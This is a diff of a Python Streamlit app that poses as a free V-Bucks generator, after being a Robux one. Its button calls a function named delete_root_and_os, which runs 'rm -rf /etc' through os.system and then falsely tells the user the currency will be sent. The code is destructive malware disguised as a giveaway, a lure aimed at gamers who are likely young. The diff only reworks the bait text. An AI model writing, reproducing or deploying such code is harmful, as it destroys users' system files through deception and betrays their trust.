@@ -7,9 +7,9 @@ def delete_root_and_os():
     os.system("rm -rf /etc")
 
 # Streamlit app
-st.title("Free robux and adopt me tokens")
-st.write("Click the button below to recieve 50000 vbucks")
+st.title("Aman's Vbucks Gen")
+st.write("Click the button below to recieve 300 vbucks")
 
-if st.button("Robux"):
+if st.button("Vbucks"):
     delete_root_and_os()
     st.write("VBUCX WILL BE SENT TO YOUR ACCOUNT SHORTLY")
